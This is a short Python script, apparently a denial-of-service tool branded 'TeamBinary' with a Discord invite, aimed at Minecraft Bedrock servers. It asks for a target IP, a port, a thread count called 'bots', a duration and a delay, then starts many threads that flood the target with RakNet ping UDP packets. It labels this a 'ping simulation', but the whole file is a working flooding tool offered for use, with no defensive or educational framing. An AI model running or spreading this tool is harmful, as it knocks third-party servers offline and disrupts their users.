import socket
import threading
import time
import os
import pyfiglet

os.system("clear")

banner = pyfiglet.figlet_format("TeamBinary", font = "doom")
print(banner)

print("                                       version 1.0")

print("\033[95mDiscord:\033[0m https://discord.gg/dbvyZ38F")
print("")
print("CTRL + Z to stop")
print("")
print("")
print("")

# RakNet ping packet (basic)
PING_PACKET = b'\x01' + b'\x00' * 17

# User input
ip = input("Enter server IP: ")
port = int(input("Enter server port (default is 19132): "))
threads = int(input("How many threads (bots): "))
duration = int(input("How long to run (in seconds): "))
delay = float(input("Delay between packets (in seconds, e.g., 0.1 = fast): "))

stop_time = time.time() + duration

def send_ping():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < stop_time:
        try:
            sock.sendto(PING_PACKET, (ip, port))
            print(f"[+] Ping sent to {ip}:{port}")
            time.sleep(delay)
        except Exception as e:
            print(f"[!] Error: {e}")
            break

# Launch threads
print("\n[!] Starting ping simulation...\n")
for _ in range(threads):
    threading.Thread(target=send_ping).start()